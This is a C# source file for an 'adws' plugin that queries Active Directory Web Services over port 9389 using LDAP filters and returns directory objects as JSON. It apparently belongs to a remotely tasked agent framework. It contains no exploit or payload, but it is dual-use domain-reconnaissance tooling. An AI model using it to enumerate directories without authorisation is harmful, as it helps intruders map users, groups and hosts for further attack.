using System.Security;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text;
using System.Text.Json;
using System.Xml;
using System.Xml.Linq;
using Workflow.Contracts;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "adws";
        private IDataBroker messageManager { get; set; }
        private ChannelFactory<IRequestChannel>? channelFactory;
        private IRequestChannel? channel;
        private string? connectedServer;

        private static readonly XNamespace WsenNs =
            "http://schemas.xmlsoap.org/ws/2004/09/enumeration";
        private static readonly XNamespace AdNs =
            "http://schemas.microsoft.com/2008/1/ActiveDirectory";
        private static readonly XNamespace AdDataNs =
            "http://schemas.microsoft.com/2008/1/ActiveDirectory/Data";
        private static readonly XNamespace WsaNs =
            "http://www.w3.org/2005/08/addressing";
        private static readonly XNamespace SoapNs =
            "http://www.w3.org/2003/05/soap-envelope";

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                var args = JsonSerializer.Deserialize<adws.AdwsArgs>(
                    job.task.parameters) ?? new adws.AdwsArgs();

                string result = args.action switch
                {
                    "connect" => Connect(args),
                    "query" => Query(args),
                    "disconnect" => Disconnect(),
                    _ => throw new ArgumentException(
                        $"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(
                    e.ToString(), job.task.id, true, "error");
            }
        }

        private string Connect(adws.AdwsArgs args)
        {
            if (string.IsNullOrEmpty(args.server))
                return "Error: server parameter is required for connect";

            if (channel != null)
                Disconnect();

            var binding = new NetTcpBinding(SecurityMode.Transport);
            binding.Security.Transport.ClientCredentialType =
                TcpClientCredentialType.Windows;
            binding.MaxReceivedMessageSize = 10485760; // 10MB
            binding.ReaderQuotas.MaxStringContentLength = 10485760;
            binding.ReaderQuotas.MaxArrayLength = 10485760;

            var endpoint = new EndpointAddress(
                $"net.tcp://{args.server}:9389/ActiveDirectoryWebServices/Windows/Enumeration");

            channelFactory = new ChannelFactory<IRequestChannel>(
                binding, endpoint);
            channel = channelFactory.CreateChannel();
            ((IClientChannel)channel).Open();

            connectedServer = args.server;
            return $"Connected to ADWS on {args.server}:9389";
        }

        private string Query(adws.AdwsArgs args)
        {
            if (channel == null || connectedServer == null)
                return "Error: not connected. Use 'connect' action first.";

            if (string.IsNullOrEmpty(args.filter))
                return "Error: filter parameter is required for query";

            string searchBase = args.searchbase;
            if (string.IsNullOrEmpty(searchBase))
                searchBase = GetDefaultNamingContext();

            // Build Enumerate request
            string enumerateXml = BuildEnumerateRequest(
                args.filter, searchBase, args.properties);

            Message enumerateMsg = Message.CreateMessage(
                MessageVersion.Default,
                "http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate",
                new XmlBodyWriter(enumerateXml));

            Message enumerateReply = channel.Request(enumerateMsg);

            string replyBody = ReadMessageBody(enumerateReply);
            var replyDoc = XDocument.Parse(replyBody);

            var context = replyDoc.Descendants(WsenNs + "EnumerationContext")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(context))
                return "Error: no enumeration context returned";

            // Pull results
            var allResults = new List<Dictionary<string, object>>();
            bool endOfSequence = false;

            while (!endOfSequence)
            {
                string pullXml = BuildPullRequest(context);
                Message pullMsg = Message.CreateMessage(
                    MessageVersion.Default,
                    "http://schemas.xmlsoap.org/ws/2004/09/enumeration/Pull",
                    new XmlBodyWriter(pullXml));

                Message pullReply = channel.Request(pullMsg);
                string pullBody = ReadMessageBody(pullReply);
                var pullDoc = XDocument.Parse(pullBody);

                endOfSequence = pullDoc.Descendants(
                    WsenNs + "EndOfSequence").Any();

                var items = pullDoc.Descendants(
                    WsenNs + "Items").Elements();
                foreach (var item in items)
                {
                    var entry = new Dictionary<string, object>();
                    foreach (var elem in item.Elements())
                    {
                        string localName = elem.Name.LocalName;
                        var values = elem.Elements().Select(
                            e => e.Value).ToList();
                        entry[localName] = values.Count == 1
                            ? values[0] : values;
                    }
                    allResults.Add(entry);
                }

                var newContext = pullDoc.Descendants(
                    WsenNs + "EnumerationContext").FirstOrDefault()?.Value;
                if (!string.IsNullOrEmpty(newContext))
                    context = newContext;
            }

            if (allResults.Count == 0)
                return "No results found";

            return JsonSerializer.Serialize(allResults,
                new JsonSerializerOptions { WriteIndented = true });
        }

        private string Disconnect()
        {
            try
            {
                if (channel != null)
                {
                    ((IClientChannel)channel).Close();
                    channel = null;
                }
                if (channelFactory != null)
                {
                    ((IDisposable)channelFactory).Dispose();
                    channelFactory = null;
                }
                string server = connectedServer ?? "unknown";
                connectedServer = null;
                return $"Disconnected from {server}";
            }
            catch (Exception e)
            {
                channel = null;
                channelFactory = null;
                connectedServer = null;
                return $"Disconnect (forced): {e.Message}";
            }
        }

        private string GetDefaultNamingContext()
        {
            // Build a rootDSE query for defaultNamingContext
            // For simplicity, construct from the server name
            // In production, query rootDSE via ADWS
            string[] parts = connectedServer!.Split('.');
            if (parts.Length >= 2)
            {
                return string.Join(",",
                    parts.Skip(1).Select(p => $"DC={p}"));
            }
            return "";
        }

        private string BuildEnumerateRequest(
            string filter, string searchBase, string properties)
        {
            var sb = new StringBuilder();
            sb.Append("<wsen:Enumerate xmlns:wsen=\"");
            sb.Append(WsenNs);
            sb.Append("\" xmlns:ad=\"");
            sb.Append(AdNs);
            sb.Append("\">");
            sb.Append("<wsen:Filter Dialect=\"http://schemas.microsoft.com/2008/1/ActiveDirectory/Dialect/LdapQuery\">");
            sb.Append("<ad:LdapQuery>");
            sb.Append($"<ad:Filter>{SecurityElement.Escape(filter)}</ad:Filter>");
            sb.Append($"<ad:BaseObject>{SecurityElement.Escape(searchBase)}</ad:BaseObject>");
            sb.Append("<ad:Scope>Subtree</ad:Scope>");
            sb.Append("</ad:LdapQuery>");
            sb.Append("</wsen:Filter>");

            if (!string.IsNullOrEmpty(properties)
                && properties != "all")
            {
                sb.Append("<ad:Selection xmlns:ad=\"");
                sb.Append(AdNs);
                sb.Append("\">");
                foreach (var prop in properties.Split(',',
                    StringSplitOptions.TrimEntries
                    | StringSplitOptions.RemoveEmptyEntries))
                {
                    sb.Append($"<ad:SelectionProperty>{SecurityElement.Escape(prop)}</ad:SelectionProperty>");
                }
                sb.Append("</ad:Selection>");
            }

            sb.Append("</wsen:Enumerate>");
            return sb.ToString();
        }

        private string BuildPullRequest(string context)
        {
            return $"<wsen:Pull xmlns:wsen=\"{WsenNs}\">"
                + $"<wsen:EnumerationContext>{context}</wsen:EnumerationContext>"
                + "<wsen:MaxElements>100</wsen:MaxElements>"
                + "</wsen:Pull>";
        }

        private static string ReadMessageBody(Message message)
        {
            using var reader = message.GetReaderAtBodyContents();
            return reader.ReadOuterXml();
        }

        private class XmlBodyWriter : BodyWriter
        {
            private readonly string xml;

            public XmlBodyWriter(string xml) : base(false)
            {
                this.xml = xml;
            }

            protected override void OnWriteBodyContents(
                XmlDictionaryWriter writer)
            {
                using var reader = XmlReader.Create(
                    new System.IO.StringReader(xml));
                writer.WriteNode(reader, true);
            }
        }
    }
}
